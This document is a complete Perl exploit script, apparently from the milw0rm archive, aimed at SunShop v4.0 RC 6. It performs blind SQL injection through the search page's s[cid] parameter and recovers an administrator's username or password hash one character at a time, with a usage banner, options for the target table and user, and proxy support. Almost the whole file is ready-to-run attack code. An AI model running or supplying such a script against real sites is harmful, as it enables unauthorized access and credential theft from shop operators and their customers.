#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[1])
{
 print "\n                         \\#'#/                      ";
 print "\n                         (-.-)                       ";
 print "\n   -----------------oOO---(_)---OOo------------------";
 print "\n   | SunShop v4.0 RC 6 (search) Blind SQL Injection |";
 print "\n   |      k1tk4t - Indonesia - newhack[dot]org      |";
 print "\n   |      coded by DNX [dnx(at)hackermail.com]      |";
 print "\n   --------------------------------------------------";
 print "\n[!] Vendor: http://www.turnkeywebtools.com";
 print "\n[!] Bug: in the search script, u can inject sql code in the s[cid] parameter";
 print "\n[!] Solution: install v4.0.1";
 print "\n[!] Usage: perl sunshop.pl [Host] [Path] <Options>";
 print "\n[!] Example: perl sunshop.pl 127.0.0.1 /shop/ -i 1 -c 10 -o 1 -t ss_admins";
 print "\n[!] Options:";
 print "\n       -i [no]       Valid User-ID, default is 1";
 print "\n       -c [no]       Valid Category-ID with products, default is 1";
 print "\n       -o [no]       1 = get username (default)";
 print "\n                     2 = get password";
 print "\n       -t [name]     Changes the admin table name, default is admins";
 print "\n       -p [ip:port]  Proxy support";
 print "\n";
 exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $user    = 1;
my $cat     = 1;
my $column  = "username";
my $table   = "admins";
my %options = ();
GetOptions(\%options, "i=i", "c=i", "o=i", "t=s", "p=s");

print "[!] Exploiting...\n";

if($options{"i"}) { $user = $options{"i"}; }
if($options{"c"}) { $cat = $options{"c"}; }
if($options{"o"} && $options{"o"} == 2) { $column = "password"; }
if($options{"t"}) { $table = $options{"t"}; }

syswrite(STDOUT, "data:", 5);

for(my $i = 1; $i <= 32; $i++)
{
 my $found = 0;
 my $h = 48;
 while(!$found && $h <= 57)
 {
   if(istrue2($host, $path, $table, $user, $i, $h))
   {
     $found = 1;
     syswrite(STDOUT, chr($h), 1);
   }
   $h++;
 }
 if(!$found)
 {
   $h = 97;
   while(!$found && $h <= 122)
   {
     if(istrue2($host, $path, $table, $user, $i, $h))
     {
       $found = 1;
       syswrite(STDOUT, chr($h), 1);
     }
     $h++;
   }
 }
}

print "\n[!] Exploit done\n";

sub istrue2
{
 my $host  = shift;
 my $path  = shift;
 my $table = shift;
 my $uid   = shift;
 my $i     = shift;
 my $h     = shift;

 my $ua = LWP::UserAgent->new;
 my $url = "http://".$host.$path."index.php?l=search_list&s[title]=Y&s[short_desc]=Y&s[full_desc]=Y&s[cid]=".$cat.")%20AND%20SUBSTRING((SELECT%20".$column."%20FROM%20".$table."%20WHERE%20id=".$uid."),".$i.",1)=CHAR(".$h.")/*";

 if($options{"p"})
 {
   $ua->proxy('http', "http://".$options{"p"});
 }

 my $response = $ua->get($url);
 my $content = $response->content;
 my $regexp = "Add To Cart";

 if($content =~ /$regexp/)
 {
   return 1;
 }
 else
 {
   return 0;
 }
}
# milw0rm.com [2007-08-25]